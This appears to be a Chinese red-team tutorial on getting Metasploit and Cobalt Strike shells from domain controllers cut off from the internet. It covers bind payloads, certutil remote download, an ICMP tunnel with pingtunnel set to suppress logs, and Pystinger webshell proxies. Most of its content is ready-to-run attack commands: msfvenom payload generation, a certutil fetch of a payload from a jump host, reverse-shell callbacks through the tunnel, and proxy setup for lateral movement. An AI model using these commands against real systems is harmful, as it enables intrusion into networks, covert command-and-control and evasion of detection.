# 一、msf正向木马拿不出网域控shell

## msf生成木马

```

msfvenom -p windows/x64/meterpreter/bind\_tcp lport=4444 -f raw -o msf1.bin
```

用msfvenom生成一个正向马传进去（因为无法访问外网，反向出不来），msf正向连接。

![](../Images/1508a73a4c4d4462285071e8651247f2.png)

## 域控上线msf

通过域控web服务的shell进行操作，域控远程下载边界跳板机上的马

```

C:\\ProgramData\\xxxx.exe -i -c "certutil -urlcache -split -f http://xxx.xxx.xxx/msf1.exe msf1.exe
```

![](../Images/ae05a049c2e116991f3e000143e15589.png)

再通过提权工具进行执行

```

C:\\ProgramData\\xxxx.exe -i -c "msf1.exe"
```

![](../Images/7203f71208c33970c136010622ff9325.png)

msf通过代理开启监听

```


proxychains msfconsole
```

![](../Images/08af0d04756be3448d6eee49a04b3157.png)

成功获取域控服务器的shell

![](../Images/63056e2865d2f0779af2d06e1b8f9be2.png)

# 三、仅ICMP出网pingtunnel上线msf&cs

## 0\. 环境搭建

WEB边界服务器是公司对外提供Web服务的机器，该机器可以通内网，同时向公网提供服务。内网同网段存在一台Windows内网服务器域控，Web服务器可以访问该机器远程桌面。当我们拿到web边界服务器的shell之后发现只能使用icmp协议访问公网vps（ping），所以只能用ICMP搭建通往内网的隧道，访问内网服务器域控进行后续攻击操作。

## 1\. pingtunnel

注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件  
由于ICMP为网络层协议，应用层防火墙无法识别，且请求包当中的数据字段被加密

## 2\. vps服务端开启

```

./pingtunnel -type server       ##开启服务器模式
```

回显0连接

![](../Images/d509ad04919ddae66c5a5841e8754bb1.png)

## 3\. 客户端开启

```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver\_ip -t c2\_server\_ip:7777 -tcp 1 -noprint 1 -nolog 1
```

客户端本地监听9999端口 ，将监听到的连接流量通过icmpserver发送到vps的Linsten\_ip:7777端口  
执行后，kali有回显

![](../Images/313e0e2359653b83eb46020cae3f0c17.png)

## 4\. msf上线

制作木马，木马的回连地址为127.0.0.1:9999,运行上线msf

```

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o msf.exe
```

![](../Images/1090f318c1e5494fd0e561730cbad4bd.png)

msf开启监听

```

```

![](../Images/9e64dfb07911c715374230163fda7466.png)

把木马msf.exe从蚁剑上传到靶机，运行

![](../Images/21404a0217b3540265e20c1b2dd36f43.png)

已上线msf

![](../Images/c2f6333fdf87ba871e7deea3e353b34d.png)

# 五、Pystinger正向代理上线不出网域控到cs

## 工具：

Pystinger

## 条件：

1.    
    
2.  TCP、ICMP、DNS均不出网。
    
3.    
    
4.  具有Web服务，并获得Webshell权限。  
    web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用
    

![](../Images/3a0bbbf3e7aa8ae212ae480b9333eb8a.png)

环境机器不可以ping通其他机器

![](../Images/1b8c8786a5bf5c9fa7f04d9d3b1db122.png)

## 1\. 上传代理文件

1.    
    
2.  通过Webshell上传Pystinger的对应语言的Webshell到目标机器，实现内网SOCK4代理， 确保http://x.x.x.x/pystinger/proxy.php可以访问，页面返回 UTF-8。
    

![](../Images/cd4c0f5392a8de64bdc31a9bb0bacabb.png)

## 2\. 服务端运行

参考github上Cobalt Strike多主机上线方式，上传stingger\_server.exe到目标机器，然后运行

```

start stinger\_server.exe 0.0.0.0
```

![](../Images/3b445f1d0ea63558b1db4b8153a5032d.png)

## 3\. 客户端运行

在VPS上上传stinger\_client，-w proxy的url地址，执行

```

./stinger\_client -w http://x.x.x.x/pystinger/proxy.php -l 0.0.0.0 -p 60000
```

![](../Images/9357186b1e0eefd91516ece82d0721d0.png)

## 4\. 创建监听器

Cobalt Strike新建监听pystinger，多主机上线设置Host为目标机器能够与更深层机器相连的内网ip：x.x.x.x，端口为60020。  
单主机上线设置Host为目标机器的ip：127.0.0.1，端口为60020，只能本主机上线

![](../Images/ea3ba58fb671fac62fd05f6d7d2c23f8.png)

## 5\. 生成木马

![](../Images/6af6a1431a45cc25a29bd9bb0ac46f39.png)

```


proxy.exe http -t tcp -p "0.0.0.0:4444" --daemon
```

![](../Images/2a85c654a4f6943d34af480c57ea34a5.png)

然后利用蚁剑将该文件上传到web服务器供不出网域控下载使用。
